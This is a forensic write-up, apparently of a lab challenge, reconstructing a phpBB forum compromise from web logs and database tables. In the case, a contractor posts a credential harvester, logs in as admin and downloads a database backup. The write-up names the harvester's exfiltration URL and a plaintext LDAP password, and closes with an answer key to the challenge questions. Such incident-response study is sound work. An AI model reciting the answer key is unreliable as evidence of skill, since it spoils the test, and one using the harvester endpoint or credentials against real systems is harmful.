![image-20240520122554693](/img/image-20240520122554693.png)

That looks like a credential harvester with the URL `http://10.10.0.78/update.php` (Task 4).

#### Identify Admin Creds Stolen

phpBB shows a post by a URL like `/viewtopic.php?f=[forum_id]&t=[topic_id]`. Given the ids from the database, I’m interested to see if the admin accessed `f=2&t=2` after 2023-04-25 12:17:22.

I’ll `grep` in the `access.log` to identify visits to this page:

```

oxdf@hacky$ cat access.log | grep 'GET /viewtopic.php?f=2&t=2'
10.10.0.78 - - [25/Apr/2023:13:17:22 +0100] "GET /viewtopic.php?f=2&t=2&sid=a179c2e371e54de2833cec27f5cd86f5 HTTP/1.1" 200 5091 "http://10.10.0.27/posting.php?mode=post&f=2&sid=a179c2e371e54de2833cec27f5cd86f5" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.255.254.2 - - [25/Apr/2023:13:17:48 +0100] "GET /viewtopic.php?f=2&t=2&sid=041ca559047513ba2267dfc066187582 HTTP/1.1" 200 5635 "http://10.10.0.27/viewforum.php?f=2&sid=041ca559047513ba2267dfc066187582" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.10.0.78 - - [25/Apr/2023:13:24:07 +0100] "GET /viewtopic.php?f=2&t=2&sid=a179c2e371e54de2833cec27f5cd86f5 HTTP/1.1" 200 6926 "http://10.10.0.27/posting.php?mode=post&f=2&sid=a179c2e371e54de2833cec27f5cd86f5" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.255.254.2 - - [25/Apr/2023:14:29:09 +0100] "GET /viewtopic.php?f=2&t=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97 HTTP/1.1" 200 5886 "http://10.10.0.27/viewforum.php?f=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:14:29:15 +0100] "GET /viewtopic.php?f=2&t=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97 HTTP/1.1" 200 5872 "http://10.10.0.27/viewforum.php?f=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:42:24 +0100] "GET /viewtopic.php?f=2&t=2&sid=041ca559047513ba2267dfc066187582 HTTP/1.1" 200 6237 "http://10.10.0.27/viewforum.php?f=2&sid=041ca559047513ba2267dfc066187582" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:42:39 +0100] "GET /viewtopic.php?f=2&t=2&sid=041ca559047513ba2267dfc066187582 HTTP/1.1" 200 6221 "http://10.10.0.27/viewforum.php?f=2&sid=041ca559047513ba2267dfc066187582" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:48:51 +0100] "GET /viewtopic.php?f=2&t=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97 HTTP/1.1" 200 6224 "http://10.10.0.27/viewforum.php?f=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:49:29 +0100] "GET /viewtopic.php?f=2&t=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97 HTTP/1.1" 200 6222 "http://10.10.0.27/viewforum.php?f=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:50:50 +0100] "GET /viewtopic.php?f=2&t=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97 HTTP/1.1" 200 6221 "http://10.10.0.27/viewforum.php?f=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:52:22 +0100] "GET /viewtopic.php?f=2&t=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97 HTTP/1.1" 200 6220 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:52:32 +0100] "GET /viewtopic.php?f=2&t=2&sid=bc7e0bea8c80bb61f562dc8aabb1ca97 HTTP/1.1" 200 6220 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:53:21 +0100] "GET /viewtopic.php?f=2&t=2&sid=7bbe2648afbe93a84c0e7f8a521732ee HTTP/1.1" 200 5869 "http://10.10.0.27/viewforum.php?f=2&sid=7bbe2648afbe93a84c0e7f8a521732ee" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:53:43 +0100] "GET /viewtopic.php?f=2&t=2&sid=7bbe2648afbe93a84c0e7f8a521732ee HTTP/1.1" 200 5869 "http://10.10.0.27/viewforum.php?f=2&sid=7bbe2648afbe93a84c0e7f8a521732ee" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [25/Apr/2023:15:54:02 +0100] "GET /viewtopic.php?f=2&t=2&sid=7bbe2648afbe93a84c0e7f8a521732ee HTTP/1.1" 200 5870 "http://10.10.0.27/viewforum.php?f=2&sid=7bbe2648afbe93a84c0e7f8a521732ee" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.255.254.2 - - [26/Apr/2023:09:11:15 +0100] "GET /viewtopic.php?f=2&t=2&sid=041ca559047513ba2267dfc066187582 HTTP/1.1" 200 6230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"

```

The attacker visits at 25/Apr/2023:13:17:22 +0100, which is exactly the time the malicious post was created (likely the software returns the user to their post once it’s created). In fact, the previous line in `access.log` is the POST to create the forum post, which returns a 302:

```
10.10.0.78 - - [25/Apr/2023:13:17:22 +0100] "POST /posting.php?mode=post&f=2&sid=a179c2e371e54de2833cec27f5cd86f5 HTTP/1.1" 302 294 "http://10.10.0.27/posting.php?mode=post&f=2&sid=a179c2e371e54de2833cec27f5cd86f5" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"

```

The rest of the views are from the admin’s IP, the first of which comes less than a minute later at 25/Apr/2023:13:17:48 +0100. The admin’s User-Agent string is there as well (Task 7).

## Contractor Login as Admin

### Log Activity

The `pbpbb_log` table has interesting data as well:

```

sqlite> .schema phpbb_log
CREATE TABLE `phpbb_log` (
  `log_id` integer  NOT NULL PRIMARY KEY AUTOINCREMENT
,  `log_type` integer NOT NULL DEFAULT 0
,  `user_id` integer  NOT NULL DEFAULT 0
,  `forum_id` integer  NOT NULL DEFAULT 0
,  `topic_id` integer  NOT NULL DEFAULT 0
,  `post_id` integer  NOT NULL DEFAULT 0
,  `reportee_id` integer  NOT NULL DEFAULT 0
,  `log_ip` varchar(40) NOT NULL DEFAULT ''
,  `log_time` integer  NOT NULL DEFAULT 0
,  `log_operation` text NOT NULL
,  `log_data` mediumtext NOT NULL
);
CREATE INDEX "idx_phpbb_log_log_type" ON "phpbb_log" (`log_type`);
CREATE INDEX "idx_phpbb_log_forum_id" ON "phpbb_log" (`forum_id`);
CREATE INDEX "idx_phpbb_log_topic_id" ON "phpbb_log" (`topic_id`);
CREATE INDEX "idx_phpbb_log_reportee_id" ON "phpbb_log" (`reportee_id`);
CREATE INDEX "idx_phpbb_log_user_id" ON "phpbb_log" (`user_id`);
CREATE INDEX "idx_phpbb_log_log_time" ON "phpbb_log" (`log_time`);

```

All of the entries are from the phpbb-admin user (id 48):

```

sqlite> select user_id, datetime(log_time, 'unixepoch'), log_ip, log_operation, log_data from phpbb_log;
user_id|datetime(log_time, 'unixepoch')|log_ip|log_operation|log_data
48|2023-04-24 16:10:16|10.255.254.2|LOG_CLEAR_ADMIN|
48|2023-04-24 16:17:18|10.255.254.2|LOG_CONFIG_REGISTRATION|
48|2023-04-24 16:19:26|10.255.254.2|LOG_ACL_ADD_FORUM_LOCAL_F_|a:2:{i:0;s:7:"Welcome";i:1;s:41:"<span class="sep">Registered users</span>";}
48|2023-04-25 11:09:07|10.255.254.2|LOG_ADMIN_AUTH_SUCCESS|
48|2023-04-25 11:09:20|10.255.254.2|LOG_USER_NEW_PASSWORD|a:1:{i:0;s:6:"apoole";}
48|2023-04-25 11:09:22|10.255.254.2|LOG_USER_USER_UPDATE|a:1:{i:0;s:6:"apoole";}
48|2023-04-25 11:09:23|10.255.254.2|LOG_USER_USER_UPDATE|a:1:{i:0;s:6:"apoole";}
48|2023-04-25 11:46:07|10.255.254.2|LOG_EXT_ENABLE|a:1:{i:0;s:13:"rokx/dborldap";}
48|2023-04-25 11:47:31|10.255.254.2|LOG_CONFIG_AUTH|
48|2023-04-25 11:48:06|10.255.254.2|LOG_USER_NEW_PASSWORD|a:1:{i:0;s:6:"apoole";}
48|2023-04-25 11:48:06|10.255.254.2|LOG_USER_USER_UPDATE|a:1:{i:0;s:6:"apoole";}
48|2023-04-25 12:13:56|10.255.254.2|LOG_CONFIG_AUTH|
48|2023-04-26 10:53:12|10.10.0.78|LOG_ADMIN_AUTH_SUCCESS|
48|2023-04-26 10:53:51|10.10.0.78|LOG_USERS_ADDED|a:2:{i:0;s:14:"Administrators";i:1;s:6:"apoole";}
48|2023-04-26 10:54:31|10.10.0.78|LOG_DB_BACKUP|

```

It looks like there’s a legit admin login at 2023-04-25 11:09:07, before the malicious post. Then there’s another login as admin from the attacker’s IP at 2023-04-26 10:53:12 (Task 5). Then the apoole user is added to the “Administrators” group at 2023-04-26 10:53:51 (task 8). And a database backup is started at 2023-04-26 10:54:31.

### Malicious Admin Activity

I’ll use `grep` and `cut` to get the interesting log events from the `access.log` for the day the contractor got admin access:

```

oxdf@hacky$ cat access.log | grep 10.10.0.78 | grep "26/Apr" | grep -v -e "GET /styles" -e "GET /adm/images" -e "GET /assets" | wc -l
56
oxdf@hacky$ cat access.log | grep 10.10.0.78 | grep "26/Apr" | grep -v -e "GET /styles" -e "GET /adm/images" -e "GET /assets" | cut -d' ' -f4-7
[26/Apr/2023:11:52:11 +0100] "GET /
[26/Apr/2023:11:52:17 +0100] "GET /cron.php?cron_type=cron.task.core.tidy_sessions&sid=894e8c0e8171f709103b4a4b5b932d95
[26/Apr/2023:11:52:18 +0100] "GET /favicon.ico
[26/Apr/2023:11:52:21 +0100] "GET /ucp.php?mode=login&sid=894e8c0e8171f709103b4a4b5b932d95
[26/Apr/2023:11:52:21 +0100] "GET /cron.php?cron_type=cron.task.core.tidy_search&sid=894e8c0e8171f709103b4a4b5b932d95
[26/Apr/2023:11:52:37 +0100] "POST /ucp.php?mode=login&sid=894e8c0e8171f709103b4a4b5b932d95
[26/Apr/2023:11:52:37 +0100] "GET /cron.php?cron_type=cron.task.core.tidy_cache&sid=894e8c0e8171f709103b4a4b5b932d95
[26/Apr/2023:11:53:01 +0100] "POST /ucp.php?mode=login&sid=894e8c0e8171f709103b4a4b5b932d95
[26/Apr/2023:11:53:01 +0100] "GET /index.php?sid=0bc281afeb61c3b9433da9871518295e
[26/Apr/2023:11:53:06 +0100] "GET /adm/index.php?sid=0bc281afeb61c3b9433da9871518295e
[26/Apr/2023:11:53:12 +0100] "POST /adm/index.php?sid=0bc281afeb61c3b9433da9871518295e
[26/Apr/2023:11:53:12 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577
[26/Apr/2023:11:53:12 +0100] "GET /adm/index.php?i=acp_help_phpbb&mode=help_phpbb&sid=eca30c1b75dc3eed1720423aa1ff9577
[26/Apr/2023:11:53:12 +0100] "GET /adm/style/admin.css?assets_version=4
[26/Apr/2023:11:53:12 +0100] "GET /ext/phpbb/viglink/styles/all/theme/viglink.css?assets_version=4
[26/Apr/2023:11:53:12 +0100] "GET /adm/style/ajax.js?assets_version=4
[26/Apr/2023:11:53:12 +0100] "GET /adm/style/admin.js?assets_version=4
[26/Apr/2023:11:53:14 +0100] "GET /ext/phpbb/viglink/styles/all/theme/images/VigLink_logo.png
[26/Apr/2023:11:53:17 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=12
[26/Apr/2023:11:53:20 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_users&icat=12&mode=overview
[26/Apr/2023:11:53:25 +0100] "POST /adm/index.php?i=acp_users&sid=eca30c1b75dc3eed1720423aa1ff9577&icat=12&mode=overview
[26/Apr/2023:11:53:34 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_groups&icat=12&mode=manage
[26/Apr/2023:11:53:37 +0100] "GET /adm/index.php?i=acp_groups&sid=eca30c1b75dc3eed1720423aa1ff9577&icat=12&mode=manage&action=list&g=5
[26/Apr/2023:11:53:51 +0100] "POST /adm/index.php?i=acp_groups&sid=eca30c1b75dc3eed1720423aa1ff9577&icat=12&mode=manage&g=5
[26/Apr/2023:11:53:54 +0100] "GET /adm/index.php?i=acp_groups&sid=eca30c1b75dc3eed1720423aa1ff9577&icat=12&mode=manage&action=list&g=5
[26/Apr/2023:11:54:02 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=25
[26/Apr/2023:11:54:17 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_database&mode=backup
[26/Apr/2023:11:54:22 +0100] "POST /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup&action=download
[26/Apr/2023:11:54:24 +0100] "GET /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup
[26/Apr/2023:11:54:30 +0100] "POST /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup&action=download
[26/Apr/2023:11:56:28 +0100] "GET /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup
[26/Apr/2023:11:56:32 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_database&mode=restore
[26/Apr/2023:11:56:53 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_logs&mode=admin
[26/Apr/2023:11:56:57 +0100] "GET /adm/index.php?i=users&mode=overview&sid=eca30c1b75dc3eed1720423aa1ff9577&u=48
[26/Apr/2023:11:57:07 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_database&mode=backup
[26/Apr/2023:11:57:20 +0100] "GET /store/
[26/Apr/2023:11:57:36 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=21
[26/Apr/2023:11:57:39 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=28
[26/Apr/2023:11:57:46 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=21
[26/Apr/2023:11:57:48 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_extensions&mode=main
[26/Apr/2023:11:58:00 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_extensions&mode=main
[26/Apr/2023:11:58:04 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_language&mode=lang_packs
[26/Apr/2023:11:58:08 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_styles&mode=style
[26/Apr/2023:11:58:13 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=28
[26/Apr/2023:11:58:18 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_php_info&icat=28&mode=info
[26/Apr/2023:11:58:45 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_bots&icat=28&mode=bots
[26/Apr/2023:11:58:50 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=25
[26/Apr/2023:11:58:54 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577
[26/Apr/2023:11:59:16 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_board&mode=load
[26/Apr/2023:11:59:26 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_board&mode=security
[26/Apr/2023:11:59:34 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=6
[26/Apr/2023:12:00:08 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=25
[26/Apr/2023:12:01:09 +0100] "GET /adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_database&mode=backup
[26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz
[26/Apr/2023:12:01:52 +0100] "GET /ucp.php?mode=logout&sid=eca30c1b75dc3eed1720423aa1ff9577
[26/Apr/2023:12:01:53 +0100] "GET /index.php?sid=be3cc6e2de08bafa4044f552813e2cbe

```

The first access to a relative path starting with `/adm` is at 10:53:06 UTC:

```

[26/Apr/2023:11:53:06 +0100] "GET /adm/index.php?sid=0bc281afeb61c3b9433da9871518295e

```

The POST at 10:54:22 may have been an attempt to start a DB backup, but the one at 10:54:30 better lines up with the log time one second later:

```

[26/Apr/2023:11:54:22 +0100] "POST /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup&action=download
[26/Apr/2023:11:54:24 +0100] "GET /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup
[26/Apr/2023:11:54:30 +0100] "POST /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup&action=download

```

At 11:01:38 there’s a request that looks to be downloading the backup as a `.sql.gz` file (Task 9):

```

[26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz

```

The full log for that shows the size of 34707 (Task 10):

```

oxdf@hacky$ cat access.log  | grep backup_1682506471_dcsr71p7fyijoyq8.sql.gz
10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1" 200 34707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"

```

## Other

The other remaining task is about the plaintext LDAP credetnails used by the forum. I’ll find these in the `phpbb_config` table. This table stores values in name and value pairs:

```

sqlite> .schema phpbb_config
CREATE TABLE `phpbb_config` (
  `config_name` varchar(255) NOT NULL DEFAULT ''
,  `config_value` varchar(255) NOT NULL DEFAULT ''
,  `is_dynamic` integer  NOT NULL DEFAULT 0
,  PRIMARY KEY (`config_name`)
);
CREATE INDEX "idx_phpbb_config_is_dynamic" ON "phpbb_config" (`is_dynamic`);

```

I’ll filter on the LDAP related ones:

```

sqlite> select config_name, config_value from phpbb_config where config_name like "%ldap%";
config_name|config_value
ldap_base_dn|OU=Forela,DC=forela,DC=local
ldap_email|
ldap_password|Passw0rd1
ldap_port|
ldap_server|10.10.0.11
ldap_uid|sAMAccountName
ldap_user|CN=phpbb-admin,OU=Service,OU=Forela,DC=forela,DC=local
ldap_user_filter|

```

The password is “Passw0rd1” (Task 6).

## Results

### Timeline

Putting all that together makes the following timeline:

| Time (UTC) | Description | Reference |
| --- | --- | --- |
| 2023-04-25 11:09:07 | Legit admin login | `phpbb_log` |
| 2023-04-25 12:15:41 | Contractor registered apoole1 | `phpbb_users` |
| 2023-04-25 12:17:22 | Malicious post created | `phpbb_posts` |
| 2023-04-25 12:17:48 | Admin first visits malicious post | `access.log` |
| 2023-04-26 10:53:12 | Contractor logs in as admin user | `phpbb_log` |
| 2023-04-26 10:53:51 | apoole user added to Administrators group | `phpbb_log` |
| 2023-04-26 10:54:30 | Request to start DB backup | `access.log` |
| 2023-04-26 10:54:31 | Contractor starts DB backup | `phpbb_log` |
| 2023-04-26-11:01:38 | Contractor downloads DB backup | `access.log` |

### Question Answers
1. What was the username of the external contractor?

   apoole1
2. What IP address did the contractor use to create their account?
   10.10.0.78
3. What is the post\_id of the malicious post that the contractor made?

   9
4. What is the full URI that the credential stealer sends its data to?

   `http://10.10.0.78/update.php`
5. When did the contractor log into the forum as the administrator? (UTC)

   26/04/2023 10:53:12
6. In the forum there are plaintext credentials for the LDAP connection, what is the password?

   Passw0rd1
7. What is the user agent of the Administrator user?

   Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
8. What time did the contractor add themselves to the Administrator group? (UTC)

   26/04/2023 10:53:51
9. What time did the contractor download the database backup? (UTC)

   26/04/2023 11:01:38
10. What was the size in bytes of the database backup as stated by access.log?

    34707